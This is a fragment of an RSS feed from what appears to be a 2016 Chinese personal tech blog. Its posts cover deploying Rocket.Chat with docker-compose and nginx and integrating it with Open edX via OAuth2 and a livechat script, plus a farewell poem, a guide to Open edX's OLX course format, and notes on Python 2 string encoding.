  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;command&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;mongod --smallfiles&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;web&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;image&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;rocketchat/rocket.chat&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;environment&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;MONGO_URL=mongodb://db:27017/meteor&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;ROOT_URL=http://119.254.98.58:8818&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;links&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;db:db&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;ports&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;8818:3000&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行服务：&lt;code&gt;docker-compose up&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;应用跑在本地8818端口,如果你端口对外打开，你已经可以正常访问了&lt;/p&gt;
&lt;p&gt;一般而言我们采用nginx来做反向代理，如果你想用webrtc功能（语音和视频），那么你需要采用https，关于https的配置，可以参考&lt;a href="http://blog.just4fun.site/https-note.html"&gt;使用Let’s Encrypt(certbot)为你的网站生成免费的 SSL 证书&lt;/a&gt;,当然也可以参考&lt;a href="https://rocket.chat/docs/installation/manual-installation/configuring-ssl-reverse-proxy-with-nginx-md"&gt;官方文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;nginx配置形如&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;upstream chat_server {
            server 127.0.0.1:8818  fail_timeout=0;
    }

server {
  listen 19818;
  ssl on;
  ssl_certificate /etc/nginx/conf/server.crt;
  ssl_certificate_key /etc/nginx/conf/server.key;
  server_name chat.example.com;

  location / {
        try_files $uri @proxy_to_app;
  }

  # No basic auth security on the heartbeat url, so that ELB can use it


location @proxy_to_app {
    proxy_set_header X-Forwarded-Proto $http_x_forwarded_proto;
    proxy_set_header Host $http_host;
    proxy_set_header X-Forwarded-For $http_x_forwarded_for;
    proxy_set_header Host $http_host;

    proxy_redirect off;
    proxy_pass http://chat_server;
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;tips&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;首位注册用户将成为管理员&lt;/li&gt;
&lt;li&gt;rocket chat中的配置十分便捷合理,贴心极了,绝大多数功能级别的配置都只需要在用户界面做就行，这点很像discourse. &lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;与你的应用整合&lt;/h1&gt;
&lt;p&gt;下边我们将以Open edX为例，将即时通信和客户系统整合到其中。当然你可以模仿着将它整合到你自己的任何系统里&lt;/p&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;Rocket.Chat与你的应用的整合主要是用户系统的整合，我们采用oauth2来整合两者。两个系统的其他功能的整合（诸如同步分组）可以通过REST apis来做，这是后话&lt;/p&gt;
&lt;p&gt;在我们的案例中，LMS作为oauth2 prividor , 而 RocketChat作为oauth2 consumer,这部分的知识可以参考oauth2文档。如果你做过insights/edxnote和LMS的对接，你大约已经熟悉了其中的流程&lt;/p&gt;
&lt;h3&gt;oauth2配置&lt;/h3&gt;
&lt;p&gt;这部分留待meetup上分享~/&lt;/p&gt;
&lt;!--

#### 在RocketChat中
*  点击头像
*  打开管理选项
*  选择页面最下边的oauth（页面提示回调url为：https://chat.example.com/_oauth/openedx）

配置参数为


wzxhzdk:2



#### 在Open edX中
sudo /edx/bin/python.edxapp /edx/bin/manage.edxapp lms --setting=aws create_oauth2_client ：https://chat.example.com https://chat.example.com/_oauth/openedx confidential --client_name chat --client_id chat --client_secret secret --trusted

--&gt;

&lt;h3&gt;启用客服功能&lt;/h3&gt;
&lt;p&gt;使用者在使用的过程中有任何问题，可以即时向课程团队/网站管理人员求助&lt;/p&gt;
&lt;p&gt;只要你在rocketchat中开启livechat功能,之后一串js代码集成到你的页面里&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;lt;!-- Start of Rocket.Chat Livechat Script --&amp;gt;
&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
(function(w, d, s, u) {
    w.RocketChat = function(c) { w.RocketChat._.push(c) }; w.RocketChat._ = []; w.RocketChat.url = u;
    var h = d.getElementsByTagName(s)[0], j = d.createElement(s);
    j.async = true; j.src = &amp;#39;https://chat.example.com/packages/rocketchat_livechat/assets/rocket-livechat.js&amp;#39;;
    h.parentNode.insertBefore(j, h);
})(window, document, &amp;#39;script&amp;#39;, &amp;#39;https://chat.example.com/livechat&amp;#39;);
&amp;lt;/script&amp;gt;
&amp;lt;!-- End of Rocket.Chat Livechat Script --&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;一些有意思的想法&lt;/h1&gt;
&lt;p&gt;将RocketChat作为client,利用它的outgoing webhook将其作为一个输入工具来用&lt;/p&gt;
&lt;p&gt;这有点像微信公众号对微信的利用&lt;/p&gt;
&lt;p&gt;我之前做了一个留言墙，就是这样实现的&lt;/p&gt;
&lt;p&gt;你可以猜猜它怎么实现的&lt;/p&gt;
&lt;p&gt;如果是早先，我会这样做:跑一个server，等待请求。如果请求合法就使用websocket post到展示页面（墙）上&lt;/p&gt;
&lt;p&gt;为了好玩，我采用了无后端的设计，对此有兴趣的同学可以看看我的&lt;a href="http://blog.just4fun.site/kinto-note-05-31.html"&gt;如何架空经常500的后端程序员&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大体的想法就是讲RocketChat作为前端，后端采用kinto（你可以理解为firebase），当有新消息到来时，采用pusher服务，将消息pusher到消息强上，历史消息存留在kinto里，不必担心遗失&lt;/p&gt;
&lt;p&gt;这样一来我们既没有写前端，也没有写后端，也没有写客户端，但却做到了可以在任何终端往消息墙里发消息。&lt;/p&gt;
&lt;p&gt;这种做法是不是感觉十分unix，所有东西都是管道，我们只要关注input/output就行，组合这些积木就能得到我们想要的东西&lt;/p&gt;
&lt;h1&gt;其他的想象空间&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;通过REST API深度整合,构建点对点指导，私有群组，收费群组&lt;/li&gt;
&lt;li&gt;想象一下可能的场景&lt;ul&gt;
&lt;li&gt;一对一在线辅导，线上家教，线上英语辅导(技术层面是点对点的webRTC，服务器基本没有压力)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;对接ai,重新打造个微信是不大可能的,而你几乎无法定制微信。而即时通信是个强需求，如何得到定制化的即时通信,诸如与现有系统整合,局域网的通信&lt;/li&gt;
&lt;li&gt;作为入口,利用incoming webhook，可以接受任何信息的输入。我们想象这样一个场景，当系统检测到异常时，发送讨论到群组，即可展开讨论，insight,这是github对hubot的用法(帮助运维的聊天机器人)&lt;/li&gt;
&lt;li&gt;用于实时课堂&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 04 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-04:build-im.html</guid><category>tools</category></item><item><title>朋友将离南京</title><link>/2016-07-02.html</link><description>&lt;p&gt;其一&lt;/p&gt;
&lt;p&gt;重来桐叶落?&lt;br /&gt;
踏雪不宜迟。&lt;br /&gt;
此去多山岭，&lt;br /&gt;
恰如我当时。&lt;/p&gt;
&lt;p&gt;其二&lt;/p&gt;
&lt;p&gt;此地知交少，&lt;br /&gt;
将行或久违。&lt;br /&gt;
真如长江水，&lt;br /&gt;
一一去不回&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 02 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-02:2016-07-02.html</guid><category>诗词</category></item><item><title>如何从外部创建edx课程及其可编程性</title><link>/OLX-guide.html</link><description>&lt;p&gt;当我们把Open edX用于spoc中，可能会有这样一种需求：如何将既有课程尽可能自动化得导入到Open edX中&lt;/p&gt;
&lt;p&gt;我想到比较好的一种策略是采用Open edX的Open Learning XML (OLX) 来做这件事&lt;/p&gt;
&lt;h1&gt;Open Learning XML (OLX)&lt;/h1&gt;
&lt;p&gt;Open Learning XML给出了一套课程文本化的描述，采用Open Learning XML，我们可以采用xml来定义我们的课程，从而做到在不使用edX Studio的情况下我们也能制作出所需的课程&lt;/p&gt;
&lt;p&gt;课程的组成结构和元素在Open Learning XML都有相应描述，参考这些描述，你可以通过任何程序/语言生成所需的课程内容，之后导入到Open edX即可&lt;/p&gt;
&lt;h3&gt;OLX的功能&lt;/h3&gt;
&lt;p&gt;顺便我们也援引一下官方对OLX功能的描述&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在不同的Open edx实例网站中迁移课程&lt;/li&gt;
&lt;li&gt;在studio外部创建课程，包括转化自不同格式的内容&lt;/li&gt;
&lt;li&gt;保证内容格式的开放性和可移植性&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;OLX与跨平台导课&lt;/h1&gt;
&lt;p&gt;假设学校已有一套采用Java语言写成的教学系统，现在我们想使用Open edX，而不想废弃既有平台的课程，那么一般的做法是认为地将课程进行转化，如果课程数量庞大，这项工作就极其耗时&lt;/p&gt;
&lt;p&gt;需要说明的是，由于平台特性上的差异，在转化之前你应当尽可能理解两个平台的特性，然后你作为一个“翻译者”，将内容形式进行转化，这部分的工作，机器无法帮到你，需要你花时间去理解课程结构,理解之后，你就可以开始将旧平台的课程，导出为OLX结构的文档，之后导入到Open edX平台中&lt;/p&gt;
&lt;h1&gt;OLX入门&lt;/h1&gt;
&lt;p&gt;如果官方能把create new repo的时间用来好好写文档，那么这部分本该很完备的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/getting-started.html"&gt;Getting Started with OLX&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/tasks/deploy-lms.html"&gt;Build a Course in OLX and Deploy to the edX LMSi&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;然而由于跳票的习惯，这部分也只是有个大纲，并没有内容，所有需要我们自力更生&lt;/p&gt;
&lt;h3&gt;课程结构&lt;/h3&gt;
&lt;p&gt;关于课程结构可以参考这个文档&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/directory-structure.html"&gt;OLX Course Structure&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;demo&lt;/h1&gt;
&lt;p&gt;文档枯燥，我们还是那一个课程demo来遛一遛吧,可以&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/example-course/index.html"&gt;Example of an OLX Course&lt;/a&gt;,习惯阅读英文的话，可以跟着文档走一遍，不习惯的话，可以跟着下文摸索&lt;/p&gt;
&lt;p&gt;我们以官方示范课程为例:&lt;a href="https://github.com/edx/edx-demo-course"&gt;edx-demo-course&lt;/a&gt;,这门课在新安装的平台中都预制了，在studio中导出到本地，然后解压后即可看到如下结构&lt;/p&gt;
&lt;p&gt;tree ./course -d(列出所有目录)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;├── about
├── annotatable
├── assets
├── chapter
├── course
├── discussion
├── drafts
│   ├── annotatable
│   ├── discussion
│   ├── html
│   ├── problem
│   ├── vertical
│   └── video
├── html
├── info
├── policies
│   └── course
├── problem
├── sequential
├── static
│   ├── VGL
│   │   ├── edx
│   │   ├── localhost
│   │   ├── mitx-lms
│   │   ├── mitx-staging
│   │   ├── original
│   │   └── sandbox
│   ├── applets
│   ├── css
│   ├── handouts
│   ├── images
│   ├── js
│   │   ├── IGV
│   │   │   ├── js
│   │   │   └── resources
│   │   ├── i18n
│   │   └── loupeAndLightbox
│   ├── jsmol
│   │   └── j2s
│   │       ├── com
│   │       │   └── jcraft
│   │       │       └── jzlib
│   │       ├── java
│   │       │   ├── awt
│   │       │   │   └── event
│   │       │   ├── io
│   │       │   ├── lang
│   │       │   │   ├── annotation
│   │       │   │   └── reflect
│   │       │   ├── net
│   │       │   ├── text
│   │       │   └── util
│   │       │       ├── regex
│   │       │       └── zip
│   │       ├── make
│   │       ├── org
│   │       │   └── jmol
│   │       │       ├── adapter
│   │       │       │   ├── readers
│   │       │       │   │   ├── cifpdb
│   │       │       │   │   ├── molxyz
│   │       │       │   │   ├── more
│   │       │       │   │   ├── quantum
│   │       │       │   │   ├── simple
│   │       │       │   │   ├── xml
│   │       │       │   │   └── xtal
│   │       │       │   └── smarter
│   │       │       ├── api
│   │       │       ├── appletjs
│   │       │       ├── atomdata
│   │       │       ├── awtjs
│   │       │       ├── awtjs2d
│   │       │       ├── bspt
│   │       │       ├── constant
│   │       │       ├── exportjs
│   │       │       ├── g3d
│   │       │       ├── geodesic
│   │       │       ├── i18n
│   │       │       ├── io
│   │       │       ├── io2
│   │       │       ├── jvxl
│   │       │       │   ├── api
│   │       │       │   ├── calc
│   │       │       │   ├── data
│   │       │       │   └── readers
│   │       │       ├── minimize
│   │       │       │   └── forcefield
│   │       │       │       └── data
│   │       │       ├── modelset
│   │       │       ├── modelsetbio
│   │       │       ├── navigate
│   │       │       ├── parallel
│   │       │       ├── quantum
│   │       │       ├── render
│   │       │       ├── renderbio
│   │       │       ├── renderspecial
│   │       │       ├── rendersurface
│   │       │       ├── script
│   │       │       ├── shape
│   │       │       ├── shapebio
│   │       │       ├── shapespecial
│   │       │       ├── shapesurface
│   │       │       ├── smiles
│   │       │       ├── symmetry
│   │       │       ├── thread
│   │       │       ├── util
│   │       │       └── viewer
│   │       │           └── binding
│   │       └── test
│   ├── molecules
│   ├── python
│   └── subs
├── tabs
├── vertical
└── video

115 directories
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其中大多目录一目了然&lt;/p&gt;
&lt;h3&gt;课程meta信息&lt;/h3&gt;
&lt;p&gt;参见root目录下的course.xml文件，这就是我们在studio中创建课程时，填写的数据&lt;/p&gt;
&lt;h3&gt;关联信息&lt;/h3&gt;
&lt;p&gt;课程的结构描述信息在course/course.xml，高级配置也在其中,这个文件的命名规则由根目录下的course.xml文件的url_name字段信息确定&lt;/p&gt;
&lt;p&gt;而course/course.xml可视为这门课程的地图&lt;/p&gt;
&lt;h3&gt;结构细节&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/studio-example/manual-testing-structure.html#the-courseware-structure-file"&gt;The Structure of the Manual Testing Course&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;对于demo课程的细节，可以阅读这篇文档&lt;/p&gt;
&lt;p&gt;其中可能引起的疑惑有两个&lt;/p&gt;
&lt;p&gt;其一是资源定位的问题，如何关联到相关资源，OLX给出的策略似乎是uuid,生成规则猜测为:&lt;code&gt;uuid.uuid4().get_hex()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其二是unicode（中文）编码的问题，如果你看到你的&lt;code&gt;python入门.pdf&lt;/code&gt;在OLX文档中变为&lt;code&gt;python\u5165\u95e8.pdf&lt;/code&gt;这是完全正常的&lt;/p&gt;
&lt;h1&gt;附&lt;/h1&gt;
&lt;h3&gt;UUID&lt;/h3&gt;
&lt;p&gt;UUID是128位的全局唯一标识符，通常由32字节的字符串表示。它可以保证时间和空间的唯一性，也称为GUID&lt;/p&gt;
&lt;p&gt;UUID主要有五个算法，也就是五种方法来实现：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;uuid1()——基于时间戳。由MAC地址、当前时间戳、随机数生成。可以保证全球范围内的唯一性， 但MAC的使用同时带来安全性问题，局域网中可以使用IP来代替MAC&lt;/li&gt;
&lt;li&gt;uuid2()——基于分布式计算环境DCE（Python中没有这个函数）&lt;/li&gt;
&lt;li&gt;uuid3()——基于名字的MD5散列值：通过计算名字和命名空间的MD5散列值得到，保证了同一命名空间中不同名字的唯一性， 和不同命名空间的唯一性，但同一命名空间的同一名字生成相同的uuid。 &lt;/li&gt;
&lt;li&gt;uuid4()——基于随机数，由伪随机数得到，有一定的重复概率，该概率可以计算出来&lt;/li&gt;
&lt;li&gt;uuid5()——基于名字的SHA-1散列值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;若在Global的分布式计算环境下，最好用uuid1；若有名字的唯一性要求，最好用uuid3或uuid5。&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.io/projects/edx-open-learning-xml/en/latest/"&gt;edX Open Learning XML Guide&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-28:OLX-guide.html</guid><category>edx</category></item><item><title>编码相关的笔记</title><link>/decode-and-encode-note.html</link><description>&lt;p&gt;编码/解码问题是个大坑，其中的复杂性，大多来自历史包袱&lt;/p&gt;
&lt;p&gt;由于计算机领域的分层架构和多平台问题，这个问题被进一步加剧，unicode的出现，给这个问题带来了曙光.&lt;/p&gt;
&lt;p&gt;可是生活不总是那么美好的，有些时候，一不小心，我们还是会掉到满是泥沼的坑里&lt;/p&gt;
&lt;p&gt;周末在凤凰书城看一本数据清洗相关的书，其中说道噪声数据的问题，有问题的编码是噪声的来源之一，书中分享了不少好用的方法，在便签里记了一些，加上之前笔记里的，正好整理成一篇文章&lt;/p&gt;
&lt;h1&gt;编码问题&lt;/h1&gt;
&lt;p&gt;这里引《中文编码杂谈》中关于乱码的讨论&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Linux平台上如果使用cat等命令查看文件中的中文内容时，可能出现乱码。这也是编码的问题。简单的说是文件时按照A编码保存，但是cat命令按照当前Locale设定的B编码去查看，在B和A不兼容的时候就出现了乱码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;核心概念&lt;/h1&gt;
&lt;p&gt;引&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;字符集&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;简单的说字符集就规定了某个文字对应的二进制数字存放方式（编码）和某串二进制数值代表了哪个文字（解码）的&lt;code&gt;转换关系&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;字符编码&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数  --wikipedia&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Unicode和UTF-8&lt;/h1&gt;
&lt;p&gt;Unicode对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。&lt;/p&gt;
&lt;p&gt;Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储&lt;/p&gt;
&lt;p&gt;而UTF-8就是字符编码，是Unicode规则字库的一种实现形式&lt;/p&gt;
&lt;h1&gt;Python中的编码问题&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;一文中描述了python中可能出现的一些编解码难题&lt;/p&gt;
&lt;p&gt;原因之一是Python 2.x默认将所有的字符串当做ASCII来对待（python3中会好很多）&lt;/p&gt;
&lt;p&gt;当你使用string类型时，实际上会储存一个字节串&lt;/p&gt;
&lt;h3&gt;解码字节流&lt;/h3&gt;
&lt;p&gt;你可以把字节流&lt;code&gt;解码&lt;/code&gt;(decode)成一个Unicode对象，把一个Unicode 对象编码(encode)为字节流&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你最好是尽早的将字节流解码为Unicode(字节流进入程序的时候)&lt;/li&gt;
&lt;li&gt;你不能简单地输出一个Unicode对象。它必须在输出前被变成一个字节串&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;str/unicode&lt;/h3&gt;
&lt;p&gt;在mac下python2.7.5&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# unicode&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;u&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\u4f60\u597d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; 
&lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;unicode_a&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;unicode_b&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;

&lt;span class="c1"&gt;# unicode_c = unicode(&amp;quot;你好&amp;quot;) python2会报错，python会把所有东西作为字节流理解&lt;/span&gt;
&lt;span class="s1"&gt;u&amp;#39;hello&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;unicode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#  True，如果&lt;/span&gt;

&lt;span class="n"&gt;unicode_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;################&lt;/span&gt;
&lt;span class="c1"&gt;# str&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;你好&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt; &lt;span class="c1"&gt;# &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;str_a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="o"&gt;==&lt;/span&gt;  &lt;span class="s2"&gt;u&amp;quot;你好&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;__repr__的目标是准确性，__str__的目标是可读性&lt;/p&gt;
&lt;h3&gt;codecs模块&lt;/h3&gt;
&lt;p&gt;codecs模块能在处理字节流的时候提供很大帮助。你可以用定义的编码来打开文件并且你从文件里读取的内容会被自动转化为Unicode对象。&lt;/p&gt;
&lt;p&gt;读写文件&lt;/p&gt;
&lt;p&gt;当从一个文件读取数据的时候，codecs.open 会创建一个文件对象能够自动将utf-8编码文件转化为一个Unicode对象,而写入文件这样写：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;codecs&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/tmp/utf-8.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\u2013&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用urllib流&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.google.com&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;Reader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getreader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; ,应该尽可能让程序内部的数据都是 &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你必须对codecs模块十分小心。你传进去的东西必须是一个Unicode对象,否则它会自动将字节流作为ASCII进行解码。&lt;/p&gt;
&lt;h3&gt;策略&lt;/h3&gt;
&lt;p&gt;python编解码涉及的问题可能很多，上至大神下至小白，都可能受扰，为了保持简单，我们可以保持这样一种习惯:关注输入输出，内部保持unicode。&lt;/p&gt;
